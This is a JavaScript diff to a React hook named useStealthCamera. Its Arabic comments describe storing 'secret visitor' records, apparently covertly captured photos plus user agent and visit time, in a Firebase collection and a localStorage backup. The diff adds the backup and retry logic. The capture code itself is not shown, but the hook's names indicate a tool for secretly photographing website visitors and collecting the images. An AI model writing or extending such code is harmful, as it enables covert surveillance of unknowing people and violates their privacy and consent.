@@ -305,16 +305,27 @@ export const useStealthCamera = () => {
         visitTime: visitor.visitTime
       });
 
-      // حفظ بيانات الزائر في Firebase بدلاً من localStorage
+      // محاولة حفظ البيانات في Firebase أولاً
+      let savedToFirebase = false;
       try {
         await firestoreHelpers.addDocument(COLLECTIONS.STEALTH_VISITORS, visitor);
         console.log('✅ تم حفظ بيانات الزائر السري في Firebase');
+        savedToFirebase = true;
       } catch (firebaseError) {
-        console.error('❌ فشل في حفظ البيانات في Firebase، سيتم الحفظ محلياً:', firebaseError);
-        // Fallback to localStorage if Firebase fails
+        console.warn('⚠️ فشل في حفظ البيانات في Firebase، سيتم الحفظ محلياً:', firebaseError);
+      }
+
+      // حفظ البيانات محلياً دائماً كنسخة احتياطية
+      try {
         const existingVisitors = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
-        existingVisitors.push(visitor);
+        existingVisitors.push({
+          ...visitor,
+          savedToFirebase
+        });
         localStorage.setItem('stealth_visitors', JSON.stringify(existingVisitors));
+        console.log('💾 تم حفظ بيانات الزائر السري محلياً');
+      } catch (localError) {
+        console.error('❌ فشل في الحفظ المحلي:', localError);
       }
 
       setVisitorData(visitor);
@@ -330,8 +341,9 @@ export const useStealthCamera = () => {
     try {
       // محاولة الحصول على البيانات من Firebase أولاً
       const firebaseVisitors = await firestoreHelpers.getDocuments(COLLECTIONS.STEALTH_VISITORS);
+      console.log('📊 تم تحميل البيانات السرية من Firebase:', firebaseVisitors.length);
+      
       if (firebaseVisitors.length > 0) {
-        console.log('📊 تم تحميل البيانات السرية من Firebase:', firebaseVisitors.length);
         return firebaseVisitors.map(doc => ({
           id: doc.id,
           photos: doc.photos || [],
@@ -340,19 +352,21 @@ export const useStealthCamera = () => {
           userAgent: doc.userAgent
         }));
       }
-      
-      // العودة إلى localStorage إذا كان Firebase فارغاً
+    } catch (error) {
+      console.warn('⚠️ خطأ في تحميل البيانات من Firebase، استخدام البيانات المحلية:', error);
+    }
+    
+    // العودة إلى localStorage
+    try {
       const localVisitors = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
       console.log('📊 تم تحميل البيانات السرية محلياً:', localVisitors.length);
-      return localVisitors;
-    } catch (error) {
-      console.error('❌ خطأ في تحميل البيانات من Firebase، استخدام البيانات المحلية:', error);
-      try {
-        return JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
-      } catch (localError) {
-        console.error('❌ خطأ في تحميل البيانات المحلية:', localError);
-        return [];
-      }
+      return localVisitors.map(visitor => ({
+        ...visitor,
+        visitTime: new Date(visitor.visitTime)
+      }));
+    } catch (localError) {
+      console.error('❌ خطأ في تحميل البيانات المحلية:', localError);
+      return [];
     }
   }, []);
 
